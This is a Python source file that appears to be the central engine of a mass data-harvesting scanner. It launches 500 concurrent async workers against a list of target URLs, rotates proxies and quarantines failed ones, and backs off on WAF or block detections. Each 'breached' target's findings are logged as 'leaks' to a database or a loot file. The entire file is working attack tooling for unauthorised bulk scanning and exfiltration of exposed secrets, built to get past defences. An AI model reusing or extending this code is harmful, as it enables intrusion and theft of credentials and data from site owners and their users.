import time
import logging
import asyncio
import sys
from datetime import datetime
from pathlib import Path

from maggie import Maggie
from shane import Shane
from router import Router
from statuses import Status
from negan_config import *

C_RED, C_GREEN, C_YELLOW, C_BLUE, C_CYAN, C_RESET = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[96m", "\033[0m"

# ULTRA 911 ARCHITECTURE: ASYNC SWARM ENGINE

class Harvester:
    def __init__(self, strategy_cfg, runtime_cfg, db_mgr, content_parser, proxy_mgr):
        self.logger = logging.getLogger("HARVESTER")
        self.strategy = strategy_cfg
        self.runtime = runtime_cfg
        self.db = db_mgr
        self.parser = content_parser
        self.transport = self.parser.transport
        self.proxy_mgr = proxy_mgr

        self.router = Router("targets.txt")
        self.maggie = Maggie()
        self.shane = Shane()
        
        self.target_warnings = {} 
        self.current_fuel = self._get_real_fuel()
        
        # [THE MUTATION] Swarm Size: 500 concurrent scanners
        self.CONCURRENCY_LIMIT = 500 

    def _get_real_fuel(self):
        count = 0
        if TANK_DIR.exists():
            for f in TANK_DIR.glob("*.txt"):
                try: count += len(open(f).read().splitlines())
                except: pass
        return count

    def _timestamp(self):
        return datetime.now().strftime("%H:%M:%S")

    async def _worker(self, queue):
        """
        The Drone: Pulls targets from the queue and fires immediately.
        """
        while True:
            url = await queue.get()
            try:
                domain = self._extract_domain(url)
                if self.target_warnings.get(domain, 0) < 2:
                    await self._execute_strike(url, domain)
            except Exception as e:
                pass
            finally:
                queue.task_done()

    async def start_mission(self):
        total_targets = self.router.get_route_count()
        if total_targets == 0:
            print(f"{self._timestamp()} | {C_YELLOW}WARNING{C_RESET} | No targets found in chamber.")
            return

        print(f"{self._timestamp()} | {C_RED}ULTRA 911{C_RESET} | IGNITION. Releasing {self.CONCURRENCY_LIMIT} Swarm Drones...")

        # Initialize network layer
        await self.transport.init_session()

        queue = asyncio.Queue()
        workers = []

        # Spawn the Swarm
        for _ in range(self.CONCURRENCY_LIMIT):
            task = asyncio.create_task(self._worker(queue))
            workers.append(task)

        # Feed the Queue
        count = 0
        for url in self.router.generator():
            await queue.put(url)
            count += 1
            if count % 200 == 0:
                self.current_fuel = self._get_real_fuel()
                self._manage_lifecycle()

        # Wait for all targets to be obliterated
        await queue.join()

        # Shut down Drones and Network
        for w in workers:
            w.cancel()
        await self.transport.close_session()
        
        print(f"{self._timestamp()} | {C_BLUE}INFO{C_RESET} | Swarm Mission Complete.")

    def _manage_lifecycle(self):
        if self.current_fuel <= TRIGGER_REFILL:
            needed = MAX_TANK - self.current_fuel
            self.shane.perform_rounds(needed)
        if self.current_fuel == 0:
            self.shane.perform_rounds(MAX_TANK)
            self.current_fuel = self._get_real_fuel()

    async def _execute_strike(self, url, domain):
        """
        Asynchronous Execution. Does not block the main thread.
        """
        status, findings = await self.parser.process_url(url)

        if status == Status.FAILED_FETCH:
            proxy = self.transport.current_proxy
            if proxy:
                # File IO offloaded to thread to prevent async block
                await asyncio.to_thread(self._evacuate_casualty, proxy)
                
        elif status == Status.HARVEST_SUCCESS:
            print(f"{self._timestamp()} | {C_GREEN}HIT{C_RESET} | TARGET BREACHED: {url}")
            for item_type, value in findings:
                val_short = value[:40] + "..." if len(value) > 40 else value
                print(f"             └── {C_YELLOW}{item_type}{C_RESET}: {val_short}")
                
                # Fully non-blocking async vault write
                try:
                    await self.db.add_leak(item_type, value, url)
                except Exception:
                    # Fallback to file if DB fails
                    await asyncio.to_thread(self._save_to_file, url, item_type, value)
                
            self.target_warnings[domain] = 0

        elif status in [Status.BLOCKED, Status.WAF_DETECTED]:
            self.target_warnings[domain] = self.target_warnings.get(domain, 0) + 1

    def _save_to_file(self, url, item_type, value):
        with open("loots.txt", "a") as f:
            f.write(f"[{self._timestamp()}] {item_type} | {url} | {value}\n")

    def _evacuate_casualty(self, proxy_str):
        proxy_clean = proxy_str.split('|')[0].strip()
        timestamp = int(time.time())
        removed = False
        for unit_file in TANK_DIR.glob("*.txt"):
            try:
                lines = open(unit_file).read().splitlines()
                original_len = len(lines)
                new_lines = [line for line in lines if proxy_clean not in line]
                if len(new_lines) < original_len:
                    with open(unit_file, 'w') as f:
                        f.write('\n'.join(new_lines) + '\n')
                    removed = True
                    break 
            except: pass
        current_fails = 1
        try:
            parts = proxy_str.split('|')
            if len(parts) > 2: current_fails = int(parts[2]) + 1
        except: pass
        hospital_entry = f"{proxy_clean}|{timestamp}|{current_fails}"
        try:
            with open(COOLING_DIR / "room_12.txt", "a") as f:
                f.write(hospital_entry + "\n")
        except: pass

    def _extract_domain(self, url):
        try: return url.split('/')[2]
        except: return "unknown"
